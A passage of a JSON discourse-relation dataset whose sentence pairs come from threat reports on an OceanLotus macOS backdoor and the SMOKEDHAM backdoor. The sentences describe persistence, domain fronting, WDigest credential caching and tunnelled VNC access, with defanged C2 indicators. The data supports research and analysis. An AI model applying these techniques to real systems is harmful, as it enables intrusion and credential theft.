        "S1": "Despite these changes however, the ability to detect the early-stage behavioral indicators of this malware can easily prevent infection and protect the organization.",
        "S2": "For more information on how Carbon Black\u2019s products protect from these threats, please see the Shlayer TAU-TIN on our user exchange.",
        "relation": "MISC"
    },
    {
        "S1": "The sample arrives as an app bundled in a Zip archive.",
        "S2": "It uses the icon for a Word document file as a disguise, attempting to pass itself off as a legitimate document file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It uses the icon for a Word document file as a disguise, attempting to pass itself off as a legitimate document file.",
        "S2": "Another technique it uses to evade detection is adding special characters to its app bundle name.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Another technique it uses to evade detection is adding special characters to its app bundle name.",
        "S2": "When a user looks for the fake doc folder via the macOS Finder app or the terminal command line, the folder's name shows \"ALL tim nha Chi Ngoc Canada.doc\" (\u201ct\u00ecm nh\u00e0 Ch\u1ecb Ng\u1ecdc\u201d roughly translates to \u201cfind Mrs. Ngoc\u2019s house\u201d).",
        "relation": "ELABORATION"
    },
    {
        "S1": "When a user looks for the fake doc folder via the macOS Finder app or the terminal command line, the folder's name shows \"ALL tim nha Chi Ngoc Canada.doc\" (\u201ct\u00ecm nh\u00e0 Ch\u1ecb Ng\u1ecdc\u201d roughly translates to \u201cfind Mrs. Ngoc\u2019s house\u201d).",
        "S2": "However, checking the original Zip file that contains the folder shows 3 unexpected bytes between \".\" and \"doc\".",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, checking the original Zip file that contains the folder shows 3 unexpected bytes between \".\" and \"doc\".",
        "S2": "The 3 bytes \"efb880\" is in UTF-8 encoding.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The 3 bytes \"efb880\" is in UTF-8 encoding.",
        "S2": "According to UTF-8 mapping, the related Unicode code is \"U+FE00\".",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to UTF-8 mapping, the related Unicode code is \"U+FE00\".",
        "S2": "\"U+FE00\" is a special Unicode control character with name variation selector-1, which provides the visual appearance of a CJK compatibility ideograph.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\"U+FE00\" is a special Unicode control character with name variation selector-1, which provides the visual appearance of a CJK compatibility ideograph.",
        "S2": "In this case, the preceding character is the general character \".\", so the variation selector does not change the visual appearance.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the preceding character is the general character \".\", so the variation selector does not change the visual appearance.",
        "S2": "The operating system sees the app bundle as an unsupported directory type, so as a default action the \u201copen\u201d command is used to execute the malicious app.",
        "relation": "MISC"
    },
    {
        "S1": "The operating system sees the app bundle as an unsupported directory type, so as a default action the \u201copen\u201d command is used to execute the malicious app.",
        "S2": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "S2": "Here is the code signing information for the app bundle sample.",
        "relation": "MISC"
    },
    {
        "S1": "Here is the code signing information for the app bundle sample.",
        "S2": "The app bundle contains two notable files:",
        "relation": "MISC"
    },
    {
        "S1": "The app bundle contains two notable files:",
        "S2": "- ALL tim nha Chi Ngoc Canada: The shell script containing the main malicious routines",
        "relation": "ELABORATION"
    },
    {
        "S1": "- ALL tim nha Chi Ngoc Canada: The shell script containing the main malicious routines",
        "S2": "- configureDefault.def: The word file displayed during execution",
        "relation": "LIST"
    },
    {
        "S1": "- configureDefault.def: The word file displayed during execution",
        "S2": "When the shell script was run, it performed the following routines:",
        "relation": "MISC"
    },
    {
        "S1": "When the shell script was run, it performed the following routines:",
        "S2": "- Delete the file quarantine attribute for the files in \"*ALL tim nha Chi Ngoc Canada.?doc*\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Delete the file quarantine attribute for the files in \"*ALL tim nha Chi Ngoc Canada.?doc*\u201d",
        "S2": "- Attempt to remove file quarantine attribute of the files in the system.",
        "relation": "NEXT"
    },
    {
        "S1": "- Attempt to remove file quarantine attribute of the files in the system.",
        "S2": "- Copy \"ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def(doc)\" to \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\"",
        "relation": "NEXT"
    },
    {
        "S1": "- Copy \"ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def(doc)\" to \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\"",
        "S2": "- Open \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\"",
        "relation": "NEXT"
    },
    {
        "S1": "- Open \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\"",
        "S2": "- Extract the b64-encoded fat binary to \"ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def(fat - binary)\", which is the second-stage payload",
        "relation": "NEXT"
    },
    {
        "S1": "- Extract the b64-encoded fat binary to \"ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def(fat - binary)\", which is the second-stage payload",
        "S2": "- Change access permission of second-stage payload to execute the launch of the second-stage payload",
        "relation": "NEXT"
    },
    {
        "S1": "- Change access permission of second-stage payload to execute the launch of the second-stage payload",
        "S2": "- Delete the malware app bundle \"ALL tim nha Chi Ngoc Canada.?doc\"",
        "relation": "NEXT"
    },
    {
        "S1": "- Delete the malware app bundle \"ALL tim nha Chi Ngoc Canada.?doc\"",
        "S2": "- Copy \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\" to \"{execution directory}/ALL tim nha Chi Ngoc Canada.doc\"",
        "relation": "NEXT"
    },
    {
        "S1": "- Copy \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\" to \"{execution directory}/ALL tim nha Chi Ngoc Canada.doc\"",
        "S2": "- Delete \"/tmp/ALL tim nha Chi Ngoc Canada.doc\"",
        "relation": "NEXT"
    },
    {
        "S1": "- Delete \"/tmp/ALL tim nha Chi Ngoc Canada.doc\"",
        "S2": "When executed, the second stage payload (ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def) performs the following malware routines:",
        "relation": "NEXT"
    },
    {
        "S1": "When executed, the second stage payload (ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def) performs the following malware routines:",
        "S2": "- Drop third-stage payload to ~/Library/User Photos/mount_devfs",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Drop third-stage payload to ~/Library/User Photos/mount_devfs",
        "S2": "- Create persistence for the sample by creating ~/Library/LaunchAgents/com.apple.marcoagent.voiceinstallerd.plist",
        "relation": "NEXT"
    },
    {
        "S1": "- Create persistence for the sample by creating ~/Library/LaunchAgents/com.apple.marcoagent.voiceinstallerd.plist",
        "S2": "- Use the touch command to change the timestamp of the sample",
        "relation": "NEXT"
    },
    {
        "S1": "- Use the touch command to change the timestamp of the sample",
        "S2": "- Delete itself",
        "relation": "NEXT"
    },
    {
        "S1": "- Delete itself",
        "S2": "In the third-stage payload (~/Library/User Photos/mount_devfs), the strings are encrypted with custom encryption using base64 encoding and byte manipulation.",
        "relation": "NEXT"
    },
    {
        "S1": "In the third-stage payload (~/Library/User Photos/mount_devfs), the strings are encrypted with custom encryption using base64 encoding and byte manipulation.",
        "S2": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "relation": "MISC"
    },
    {
        "S1": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "S2": "It collects the following information from the infected system by invoking the following commands:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It collects the following information from the infected system by invoking the following commands:",
        "S2": "The collected information is encrypted and sent to the malware C&C server.",
        "relation": "NEXT"
    },
    {
        "S1": "The collected information is encrypted and sent to the malware C&C server.",
        "S2": "It also receives commands from the same server.",
        "relation": "NEXT"
    },
    {
        "S1": "It also receives commands from the same server.",
        "S2": "Here are the C&C servers used by the malware:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here are the C&C servers used by the malware:",
        "S2": "The new variant\u2019s backdoor capabilities are similar to those of the old OceanLotus sample, as detailed in the code excerpts below:",
        "relation": "MISC"
    },
    {
        "S1": "The new variant\u2019s backdoor capabilities are similar to those of the old OceanLotus sample, as detailed in the code excerpts below:",
        "S2": "Below are the supported commands and their respective codes (taken from an earlier blog post that covered OceanLotus).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.",
        "S2": "The downloaded file was extracted to",
        "relation": "NEXT"
    },
    {
        "S1": "The downloaded file was extracted to",
        "S2": "Mandiant confirmed the user intended to download, install, and use the SmartPSS software.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mandiant confirmed the user intended to download, install, and use the SmartPSS software.",
        "S2": "Figure 2 shows an image of the download page used for SmartPSS software.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 2 shows an image of the download page used for SmartPSS software.",
        "S2": "The installer executable is a Nullsoft installer that when executed wrote two files to C:\\ProgramData\\SMARTPSS-Win32_ChnEng_IS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The installer executable is a Nullsoft installer that when executed wrote two files to C:\\ProgramData\\SMARTPSS-Win32_ChnEng_IS.",
        "S2": "We were able to extract the malicious installer script and files for analysis using 7-Zip.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We were able to extract the malicious installer script and files for analysis using 7-Zip.",
        "S2": "The relevant section of this installer script is shown below in Figure 3.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The relevant section of this installer script is shown below in Figure 3.",
        "S2": "The installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6).",
        "S2": "The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.",
        "relation": "NEXT"
    },
    {
        "S1": "The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.",
        "S2": "The latter is launched with a command line URL executing the content.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The latter is launched with a command line URL executing the content.",
        "S2": "The smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown.",
        "relation": "MISC"
    },
    {
        "S1": "The smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown.",
        "S2": "Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.",
        "relation": "NEXT"
    },
    {
        "S1": "Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.",
        "S2": "This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy.",
        "S2": "Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4.",
        "relation": "MISC"
    },
    {
        "S1": "Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4.",
        "S2": "Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line.",
        "relation": "MISC"
    },
    {
        "S1": "Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line.",
        "S2": "Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.",
        "S2": "According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions.",
        "S2": "The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory.",
        "relation": "MISC"
    },
    {
        "S1": "The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory.",
        "S2": "Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "S2": "At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code.",
        "relation": "MISC"
    },
    {
        "S1": "At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code.",
        "S2": "It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant.",
        "S2": "A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served.",
        "relation": "MISC"
    },
    {
        "S1": "A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served.",
        "S2": "Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.",
        "S2": "Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler.",
        "relation": "NEXT"
    },
    {
        "S1": "Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler.",
        "S2": "Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "relation": "MISC"
    },
    {
        "S1": "Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "S2": "After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.",
        "relation": "MISC"
    },
    {
        "S1": "After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.",
        "S2": "The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.",
        "S2": "The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.",
        "S2": "The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.",
        "S2": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "S2": "The SMOKEDHAM backdoor source code is embedded as an encrypted string.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The SMOKEDHAM backdoor source code is embedded as an encrypted string.",
        "S2": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "S2": "After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.",
        "relation": "NEXT"
    },
    {
        "S1": "After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.",
        "S2": "The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.",
        "relation": "NEXT"
    },
    {
        "S1": "The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.",
        "S2": "Figure 7 shows the deobfuscated SMOKEDHAM dropper.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 7 shows the deobfuscated SMOKEDHAM dropper.",
        "S2": "SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.",
        "relation": "MISC"
    },
    {
        "S1": "SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.",
        "S2": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.",
        "S2": "SMOKEDHAM communicates with its C2 server using HTTPS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SMOKEDHAM communicates with its C2 server using HTTPS.",
        "S2": "The backdoor uses domain fronting to obfuscate its true C2 server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor uses domain fronting to obfuscate its true C2 server.",
        "S2": "The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.",
        "S2": "Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.",
        "S2": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
        "S2": "The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.",
        "S2": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "relation": "MISC"
    },
    {
        "S1": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "S2": "The ID field contains a unique value generated by the backdoor for the target system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ID field contains a unique value generated by the backdoor for the target system.",
        "S2": "The UUID field may contain a unique value used to track command output or be empty.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The UUID field may contain a unique value used to track command output or be empty.",
        "S2": "When the C2 server responds with a command to execute, it sets the UUID field to a unique value.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When the C2 server responds with a command to execute, it sets the UUID field to a unique value.",
        "S2": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.",
        "relation": "NEXT"
    },
    {
        "S1": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.",
        "S2": "The Data field may contain RC4-encrypted, Base64-encoded command data or be empty.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Data field may contain RC4-encrypted, Base64-encoded command data or be empty.",
        "S2": "The backdoor uses the Data field to send command output to its C2 server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor uses the Data field to send command output to its C2 server.",
        "S2": "The C2 server uses the Data field to send commands to the backdoor to execute.",
        "relation": "NEXT"
    },
    {
        "S1": "The C2 server uses the Data field to send commands to the backdoor to execute.",
        "S2": "The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.",
        "S2": "Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.",
        "S2": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "S2": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.",
        "relation": "NEXT"
    },
    {
        "S1": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.",
        "S2": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "S2": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "relation": "NEXT"
    },
    {
        "S1": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "S2": "In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",
        "relation": "NEXT"
    },
    {
        "S1": "In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",
        "S2": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.",
        "relation": "NEXT"
    },
    {
        "S1": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.",
        "S2": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "relation": "MISC"
    },
    {
        "S1": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "S2": "The following commands were used to collect information about the system and logged in users.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following commands were used to collect information about the system and logged in users.",
        "S2": "- net.exe user net.exe users",
        "relation": "ELABORATION"
    },
    {
        "S1": "- net.exe user net.exe users",
        "S2": "- whoami.exe whoami.exe /priv systeminfo.exe",
        "relation": "LIST"
    },
    {
        "S1": "- whoami.exe whoami.exe /priv systeminfo.exe",
        "S2": "The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.",
        "relation": "LIST"
    },
    {
        "S1": "The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.",
        "S2": "The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication.",
        "relation": "LIST"
    },
    {
        "S1": "The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication.",
        "S2": "Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.",
        "relation": "NEXT"
    },
    {
        "S1": "Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.",
        "S2": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "relation": "LIST"
    },
    {
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "S2": "These files were saved to the %APPDATA%\\Chrome\\ directory.",
        "relation": "NEXT"
    },
    {
        "S1": "These files were saved to the %APPDATA%\\Chrome\\ directory.",
        "S2": "The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1.",
        "relation": "NEXT"
    },
    {
        "S1": "The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1.",
        "S2": "SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.",
        "S2": "SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.",
        "relation": "NEXT"
    },
    {
        "S1": "SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.",
        "S2": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "relation": "LIST"
    },
    {
        "S1": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "S2": "These files were stored in the C:\\ProgramData\\WindNT\\ directory.",
        "relation": "NEXT"
    },
    {
        "S1": "These files were stored in the C:\\ProgramData\\WindNT\\ directory.",
        "S2": "NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.",
        "relation": "MISC"
    },
    {
        "S1": "NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.",
        "S2": "The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.",
        "S2": "SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.",
        "S2": "This attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe.",
        "relation": "LIST"
    },
    {
        "S1": "This attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe.",
        "S2": "The keylogging utility was configured to capture and record keystrokes to C:\\ProgramData\\psh\\System32Log.txt.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The keylogging utility was configured to capture and record keystrokes to C:\\ProgramData\\psh\\System32Log.txt.",
        "S2": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "relation": "NEXT"
    },
    {
        "S1": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "S2": "The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations:",
        "relation": "NEXT"
    },
    {
        "S1": "The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations:",
        "S2": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "S2": "Update.exe was a Go based dropper created using the ScareCrow framework.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Update.exe was a Go based dropper created using the ScareCrow framework.",
        "S2": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.",
        "relation": "MISC"
    },
    {
        "S1": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.",
        "S2": "The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.",
        "relation": "MISC"
    },
    {
        "S1": "The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.",
        "S2": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "relation": "NEXT"
    },
    {
        "S1": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "S2": "Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload.",
        "relation": "NEXT"
    },
    {
        "S1": "Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload.",
